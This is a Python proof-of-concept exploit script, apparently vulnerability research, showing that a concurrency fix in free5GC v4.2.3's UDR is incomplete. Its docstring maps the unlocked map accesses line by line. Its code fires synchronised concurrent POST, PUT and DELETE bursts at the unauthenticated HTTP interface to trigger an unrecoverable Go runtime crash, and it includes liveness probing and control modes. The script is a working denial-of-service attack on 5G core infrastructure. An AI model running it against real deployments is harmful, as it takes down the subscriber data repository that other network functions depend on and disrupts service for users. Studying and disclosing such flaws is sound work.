#!/usr/bin/env python3
"""
udr_race_v423.py -- PoC for the INCOMPLETE concurrency fix in free5GC v4.2.3's UDR
                    (CWE-362 -> CWE-366 -> unrecoverable runtime.throw, exit 2)

WHAT THIS PROVES
----------------
free5GC v4.2.3 ships UDR commit b649f90d (= tag v1.4.4). That release contains
upstream's fix for the concurrent-map crash on the policy-data subscription map:
a new mutex-guarded helper CreatePolicyDataSubscription(). This PoC shows the
fix is bypassable -- the very same unrecoverable `fatal error: concurrent map
writes` still kills the UDR on the patched release, by two independent routes.

All line numbers below are for UDR tag v1.4.4 / commit
b649f90d39a99007dcbf081fcb3479477e28b6eb, which is exactly what
free5gc/udr:v4.2.3 reports in its startup banner.

ARM 1 -- the map the fix DOES cover is still raced (--mode mixed)
    internal/context/context.go:68   PolicyDataSubscriptions map[subsId]*models.PolicyDataSubscription
    internal/context/context.go:36   ...created as a PLAIN map (not sync.Map)
    internal/context/context.go:71   mtx sync.RWMutex
    internal/context/context.go:220-229  CreatePolicyDataSubscription()
    internal/context/context.go:221      mtx.Lock()          <-- the v1.4.4 fix
    internal/context/context.go:225      PolicyDataSubscriptions[id] = &s   (LOCKED write)

    Only TWO mtx.Lock() call sites exist in the entire internal/ tree, both in
    context.go (:214 and :221). Every other access to the SAME map is unlocked:

    internal/sbi/processor/default.go:195   _, ok := ...PolicyDataSubscriptions[subsId]  UNLOCKED read   (DELETE path)
    internal/sbi/processor/default.go:202   delete(...PolicyDataSubscriptions, subsId)   UNLOCKED delete (DELETE path)
    internal/sbi/processor/default.go:210   _, ok := ...PolicyDataSubscriptions[subsId]  UNLOCKED read   (PUT path)
    internal/sbi/processor/default.go:218   ...PolicyDataSubscriptions[subsId] = &s      UNLOCKED write  (PUT path)
    internal/sbi/processor/callback.go:133  for _, s := range ...PolicyDataSubscriptions UNLOCKED iterate

    A mutex only excludes other holders of the SAME mutex. POST takes it; DELETE,
    PUT and the callback iterator do not. So a locked write at context.go:225
    running concurrently with the unlocked write at default.go:218, the unlocked
    delete at default.go:202, or the unlocked reads at :195/:210 still trips the
    Go runtime's hashWriting / mapWriting flag check.

ARM 2 -- a second map that NO fix ever covered (--mode subsdata)
    internal/context/context.go:67   SubscriptionDataSubscriptions map[subsId]*models.SubscriptionDataSubscriptions
    internal/context/context.go:35   ...created as a PLAIN map
    internal/sbi/processor/subs_to_notify_collection.go:28  newSubscriptionID := strconv.Itoa(...IDGenerator)
    internal/sbi/processor/subs_to_notify_collection.go:29  SubscriptionDataSubscriptions[id] = &s   UNLOCKED write
    internal/sbi/processor/subs_to_notify_collection.go:30  ...IDGenerator++                        UNLOCKED ++
    internal/sbi/processor/subs_to_notify_document.go:25    UNLOCKED read
    internal/sbi/processor/subs_to_notify_document.go:33    UNLOCKED delete
    internal/sbi/processor/callback.go:98                   UNLOCKED iterate

    v1.4.4 changed nothing here -- `git diff v1.4.3 v1.4.4` does not touch
    subs_to_notify_collection.go or subs_to_notify_document.go at all. Two
    concurrent POSTs are two unlocked writes to one plain map.

WHY IT IS UNRECOVERABLE
-----------------------
Concurrent map access makes the Go runtime call fatal("concurrent map writes")
/ fatal("concurrent map read and map write"). That is runtime.throw, NOT panic:
it cannot be caught by gin's Recovery middleware, by the `defer func(){recover()}`
in callback.go:124-129, or by any other recover(). The whole UDR process aborts
with exit status 2. The compose file has no `restart:` policy, so the NF stays
down and every NF that depends on the UDR (UDM, PCF, CHF, SMF via UDM) loses its
data repository until a human restarts the container.

REACHABILITY
------------
The UDR SBI is plain HTTP (config/udrcfg.yaml: sbi.scheme http, port 8000) and
AuthorizationCheck() is a pass-through when OAuth2 is not configured -- the
running UDR logs `OAuth2 setting receive from NRF: false`. No token, no
certificate, no authentication of any kind is required.

NOTE ON REQUEST BODIES (changed since v4.2.2)
--------------------------------------------
v1.4.4 also fixed the fail-open deserialization bug (CVE-2026-40343 family):
HandlePolicyDataSubsToNotifyPost / ...SubsIdPut now call getDataFromRequestBody()
(api_datarepository.go:1279-1298) and `return` on error, so a malformed body no
longer reaches the processor. The bodies below therefore genuinely deserialize --
verified against the live target, POST returns 201 Created.

EXPERIMENTAL DESIGN
-------------------
  --mode post      POSITIVE CONTROL. Concurrent POST only, i.e. locked vs locked.
                   Expected to SURVIVE: this demonstrates the v1.4.4 mutex really
                   does serialize the case it was written for, so a kill in
                   `mixed` cannot be dismissed as "the fix does nothing".
  --mode mixed     ARM 1. Concurrent locked POST + unlocked PUT + unlocked DELETE
                   + unlocked 404-path read, all on PolicyDataSubscriptions.
                   Expected to KILL.
  --mode subsdata  ARM 2. Concurrent POST only, on the never-locked
                   SubscriptionDataSubscriptions map. Expected to KILL.
  --serialize      NEGATIVE CONTROL. Same mode, same byte-for-byte requests, same
                   total volume, but strictly one at a time. Must never kill.

`mixed` primes two ID pools first (serially, so priming itself cannot race):
  put_ids  never deleted, so PUT keeps hitting default.go:218 (unlocked WRITE)
           for the whole run instead of degrading into 404s
  del_ids  consumed by DELETE, so default.go:202 (unlocked delete) really runs;
           re-primed automatically when exhausted

Usage
-----
    ./udr_race_v423.py --target 10.100.200.11 --port 8000 --mode post
    ./udr_race_v423.py --target 10.100.200.11 --port 8000 --mode mixed
    ./udr_race_v423.py --target 10.100.200.11 --port 8000 --mode subsdata
    ./udr_race_v423.py --target 10.100.200.11 --port 8000 --mode mixed --serialize

Exit status: 0 = UDR killed, 1 = survived all rounds, 2 = usage/connection error.
"""

import argparse
import http.client
import json
import re
import socket
import sys
import threading
import time

POLICY_PATH = "/nudr-dr/v2/policy-data/subs-to-notify"
SUBSDATA_PATH = "/nudr-dr/v2/subscription-data/subs-to-notify"

# Verified against the live v4.2.3 UDR: both return 201 Created, i.e. they pass
# getDataFromRequestBody()/openapi.Deserialize and really reach the processor.
BODY = json.dumps({
    "notificationUri": "http://127.0.0.1:9/never",
    "monitoredResourceUris": ["http://127.0.0.1:9/x"],
    "contextIdList": [],
    "nfTypeList": [],
    "supportedFeatures": "FFFF",
}).encode()

SUBSDATA_BODY = json.dumps({
    "nfInstanceID": "00000000-0000-0000-0000-000000000000",
    "plmnId": {"mcc": "208", "mnc": "93"},
    "callbackReference": "http://127.0.0.1:9/never",
    "monitoringEventIds": [],
}).encode()

# An ID that can never exist: PolicyDataSubscriptionIDGenerator starts at 1
# (context.go:34), so DELETE on this ID takes the 404 branch at default.go:196-201
# -- but still performs the UNLOCKED map read at default.go:195 first.
BOGUS_ID = "0"


def log(msg):
    sys.stderr.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), msg))
    sys.stderr.flush()


class Conn:
    """One persistent HTTP/1.1 connection per worker thread."""

    def __init__(self, host, port, timeout):
        self.host, self.port, self.timeout = host, port, timeout
        self.c = None
        self.connect()

    def connect(self):
        self.c = http.client.HTTPConnection(self.host, self.port,
                                           timeout=self.timeout)

    def send(self, method, path, body, want_location=False):
        hdr = {"Content-Type": "application/json",
               "Content-Length": str(len(body)),
               "Connection": "keep-alive"}
        try:
            self.c.request(method, path, body=body, headers=hdr)
            r = self.c.getresponse()
            r.read()
            if want_location:
                return r.status, r.getheader("Location")
            return r.status, None
        except Exception:
            # The UDR died mid-request; reconnect so later probes still work.
            try:
                self.c.close()
            except Exception:
                pass
            self.connect()
            return None, None


def udr_alive(host, port, timeout=2.0):
    """Cheap liveness probe: any HTTP response at all means the process is up."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.sendall(b"GET /nudr-dr/v2/policy-data/subs-to-notify HTTP/1.1\r\n"
                  b"Host: x\r\nConnection: close\r\n\r\n")
        data = s.recv(16)
        return len(data) > 0
    except Exception:
        return False
    finally:
        s.close()


def prime(host, port, path, body, n, timeout=10.0):
    """Serially create n subscriptions and return their subsIds.

    Serial on purpose: priming must not itself race, otherwise the negative
    control would be unfair. IDs come from the Location response header, which
    default.go:186-189 / subs_to_notify_collection.go:34-37 set to
    .../subs-to-notify/<newSubscriptionID>.
    """
    ids = []
    c = http.client.HTTPConnection(host, port, timeout=timeout)
    hdr = {"Content-Type": "application/json",
           "Content-Length": str(len(body))}
    for _ in range(n):
        try:
            c.request("POST", path, body=body, headers=hdr)
            r = c.getresponse()
            r.read()
            loc = r.getheader("Location") or ""
            m = re.search(r"/subs-to-notify/([^/?#]+)", loc)
            if r.status == 201 and m:
                ids.append(m.group(1))
        except Exception as e:
            log("prime: connection lost (%s) -- %d ids so far" % (e, len(ids)))
            try:
                c.close()
            except Exception:
                pass
            c = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        c.close()
    except Exception:
        pass
    return ids


def fire(conns, barrier, plan):
    """Release all workers at once. plan[i] = (method, path, body)."""
    out = [None] * len(conns)

    def worker(i):
        m, p, b = plan[i]
        barrier.wait()
        out[i] = conns[i].send(m, p, b)[0]

    ts = [threading.Thread(target=worker, args=(i,)) for i in range(len(conns))]
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    return out


def build_plan(concurrency, mode, seq, put_ids, del_ids):
    """A barrier-aligned burst of requests against one specific racy map."""
    plan = []
    for i in range(concurrency):
        if mode == "post":
            # POSITIVE CONTROL: locked write vs locked write (context.go:221-225).
            plan.append(("POST", POLICY_PATH, BODY))
        elif mode == "subsdata":
            # ARM 2: unlocked write vs unlocked write
            # (subs_to_notify_collection.go:29) -- no lock exists to take.
            plan.append(("POST", SUBSDATA_PATH, SUBSDATA_BODY))
        else:
            # ARM 1: locked POST write racing UNLOCKED accesses to the same map.
            r = (seq + i) % 8
            if r < 3:
                # context.go:225 -- the write the v1.4.4 mutex protects
                plan.append(("POST", POLICY_PATH, BODY))
            elif r < 6:
                # default.go:210 unlocked read + default.go:218 UNLOCKED WRITE.
                # put_ids are never deleted, so this stays a real write all run.
                pid = put_ids[(seq * 3 + i) % len(put_ids)] if put_ids else BOGUS_ID
                plan.append(("PUT", POLICY_PATH + "/" + pid, BODY))
            elif r == 6:
                # default.go:195 unlocked read + default.go:202 UNLOCKED DELETE
                did = del_ids[(seq * 7 + i) % len(del_ids)] if del_ids else BOGUS_ID
                plan.append(("DELETE", POLICY_PATH + "/" + did, b""))
            else:
                # default.go:195 unlocked read only, then the 404 early return
                plan.append(("DELETE", POLICY_PATH + "/" + BOGUS_ID, b""))
    return plan


def main():
    ap = argparse.ArgumentParser(
        description="free5GC v4.2.3 UDR incomplete-concurrency-fix PoC "
                    "(CWE-362 -> runtime.throw -> exit 2)")
    ap.add_argument("--target", default="10.100.200.11",
                    help="UDR SBI IPv4 address (default: %(default)s)")
    ap.add_argument("--port", type=int, default=8000,
                    help="UDR SBI port (default: %(default)s)")
    ap.add_argument("--concurrency", type=int, default=64,
                    help="simultaneous requests per round (default: %(default)s)")
    ap.add_argument("--rounds", type=int, default=200,
                    help="max rounds before giving up (default: %(default)s)")
    ap.add_argument("--mode", choices=["post", "mixed", "subsdata"],
                    default="mixed",
                    help="post = POSITIVE CONTROL, locked-vs-locked only; "
                         "mixed = ARM 1, locked POST vs unlocked PUT/DELETE/read "
                         "on PolicyDataSubscriptions; subsdata = ARM 2, the "
                         "never-locked SubscriptionDataSubscriptions map")
    ap.add_argument("--serialize", action="store_true",
                    help="NEGATIVE CONTROL: same request count and mix, but "
                         "strictly one at a time. Must never kill the UDR.")
    ap.add_argument("--prime-put", type=int, default=32,
                    help="subscriptions pre-created for the PUT arm (default: %(default)s)")
    ap.add_argument("--prime-del", type=int, default=256,
                    help="subscriptions pre-created for the DELETE arm; re-primed "
                         "when exhausted (default: %(default)s)")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--settle", type=float, default=0.05,
                    help="pause between rounds (default: %(default)s)")
    ap.add_argument("--probe-after", type=float, default=2.0,
                    help="how long to keep probing once the UDR stops answering")
    args = ap.parse_args()

    log("target      : http://%s:%d" % (args.target, args.port))
    log("mode        : %s%s" % (args.mode, "  [SERIALIZED CONTROL]"
                                if args.serialize else ""))
    log("concurrency : %d   rounds: %d" % (args.concurrency, args.rounds))

    if not udr_alive(args.target, args.port):
        log("ERROR: UDR is not answering before we start -- nothing to prove")
        return 2

    log("UDR alive before attack: YES")

    # --- priming (serial, so it cannot itself be the race) -----------------
    put_ids, del_ids = [], []
    if args.mode == "mixed":
        put_ids = prime(args.target, args.port, POLICY_PATH, BODY,
                        args.prime_put, args.timeout)
        log("primed %d PUT ids: %s%s" % (
            len(put_ids), put_ids[:4], " ..." if len(put_ids) > 4 else ""))
        del_ids = prime(args.target, args.port, POLICY_PATH, BODY,
                        args.prime_del, args.timeout)
        log("primed %d DELETE ids: %s%s" % (
            len(del_ids), del_ids[:4], " ..." if len(del_ids) > 4 else ""))
        if not put_ids:
            log("ERROR: could not prime any subscription id -- the PUT/DELETE "
                "arms would silently degrade to 404 reads")
            return 2
        if not udr_alive(args.target, args.port):
            log("ERROR: UDR died during SERIAL priming -- that is not the race, "
                "aborting so the evidence stays attributable")
            return 2

    conns = []
    try:
        for _ in range(args.concurrency):
            conns.append(Conn(args.target, args.port, args.timeout))
    except Exception as e:
        log("ERROR: cannot open %d connections: %s" % (args.concurrency, e))
        return 2
    log("opened %d persistent connections" % len(conns))

    total_requests = 0
    reprimes = 0
    t0 = time.time()
    killed_round = None
    seq = 0

    for seq in range(1, args.rounds + 1):
        plan = build_plan(args.concurrency, args.mode, seq, put_ids, del_ids)

        if args.serialize:
            # Control: identical bytes, identical volume, no concurrency.
            for i in range(len(conns)):
                conns[i].send(*plan[i])
        else:
            barrier = threading.Barrier(len(conns))
            fire(conns, barrier, plan)

        total_requests += len(plan)

        if not udr_alive(args.target, args.port, timeout=1.0):
            # Confirm it is really gone, not just briefly busy.
            deadline = time.time() + args.probe_after
            still_down = True
            while time.time() < deadline:
                if udr_alive(args.target, args.port, timeout=1.0):
                    still_down = False
                    break
                time.sleep(0.2)
            if still_down:
                killed_round = seq
                log("*** UDR STOPPED ANSWERING at round %d (%d requests, "
                    "%.2fs) ***" % (seq, total_requests, time.time() - t0))
                break
            else:
                # transient: rebuild connections and carry on
                for j in range(len(conns)):
                    conns[j].connect()

        # DELETE consumes del_ids; refresh the pool so default.go:202 keeps
        # executing a real delete instead of degrading to a 404 read.
        if (args.mode == "mixed" and not args.serialize and del_ids
                and seq % 8 == 0):
            used = (seq * args.concurrency) // 8
            if used >= len(del_ids):
                fresh = prime(args.target, args.port, POLICY_PATH, BODY,
                              args.prime_del, args.timeout)
                if fresh:
                    del_ids = fresh
                    reprimes += 1
                    log("re-primed %d DELETE ids (reprime #%d)"
                        % (len(fresh), reprimes))
                if not udr_alive(args.target, args.port):
                    killed_round = seq
                    log("*** UDR STOPPED ANSWERING during re-prime at round %d "
                        "(%d requests, %.2fs) ***"
                        % (seq, total_requests, time.time() - t0))
                    break

        if args.settle:
            time.sleep(args.settle)

        if seq % 25 == 0:
            log("round %d/%d done, %d requests sent, UDR still alive"
                % (seq, args.rounds, total_requests))

    elapsed = time.time() - t0

    print("=== udr_race_v423 result ===")
    print("target            : %s:%d" % (args.target, args.port))
    print("mode              : %s%s" % (args.mode,
                                       " [SERIALIZED CONTROL]"
                                       if args.serialize else ""))
    print("concurrency       : %d" % args.concurrency)
    print("rounds run        : %d" % (killed_round or seq))
    print("requests sent     : %d" % total_requests)
    print("primed put ids    : %d" % len(put_ids))
    print("primed delete ids : %d (reprimes: %d)" % (len(del_ids), reprimes))
    print("serialized        : %s" % ("YES" if args.serialize else "no"))
    print("elapsed seconds   : %.2f" % elapsed)
    print("udr killed        : %s" % ("YES" if killed_round else "NO"))
    if killed_round:
        print("killed at round   : %d" % killed_round)
    return 0 if killed_round else 1


if __name__ == "__main__":
    sys.exit(main())
